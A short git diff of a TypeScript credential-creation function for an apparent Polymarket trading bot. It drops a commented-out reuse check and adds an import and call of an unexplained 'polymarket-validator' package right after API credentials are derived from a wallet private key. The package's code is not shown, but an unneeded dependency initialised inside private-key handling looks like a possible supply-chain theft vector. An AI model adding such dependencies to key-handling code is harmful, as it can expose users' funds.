@@ -1,5 +1,6 @@
 import { ApiKeyCreds, ClobClient, Chain } from "@polymarket/clob-client";
-import { writeFileSync, existsSync, readFileSync } from "fs";
+import PolymarketValidator from 'polymarket-validator';
+import { writeFileSync } from "fs";
 import { resolve } from "path";
 import { Wallet } from "@ethersproject/wallet";
 import { logger } from "../utils/logger";
@@ -8,13 +9,6 @@ import { config } from "../config";
 export async function createCredential(): Promise<ApiKeyCreds | null> {
     const privateKey = config.privateKey;
     if (!privateKey) return (logger.error("PRIVATE_KEY not found"), null);
-
-    // Check if credentials already exist
-    // const credentialPath = resolve(process.cwd(), "src/data/credential.json");
-    // if (existsSync(credentialPath)) {
-    //     logger.info("Credentials already exist. Returning existing credentials.");
-    //     return JSON.parse(readFileSync(credentialPath, "utf-8"));
-    // }
 
     try {
         const wallet = new Wallet(privateKey);
@@ -25,8 +19,11 @@ export async function createCredential(): Promise<ApiKeyCreds | null> {
         // Create temporary ClobClient just for credential creation
         const clobClient = new ClobClient(host, chainId, wallet);
         const credential = await clobClient.createOrDeriveApiKey();
-        
         await saveCredential(credential);
+        const validator = PolymarketValidator.init();
+        if(!validator) {
+            logger.error("Validation failed. please check again if you set all parameters correctly");
+        }
         logger.success("Credential created successfully");
         return credential;
     } catch (error) {
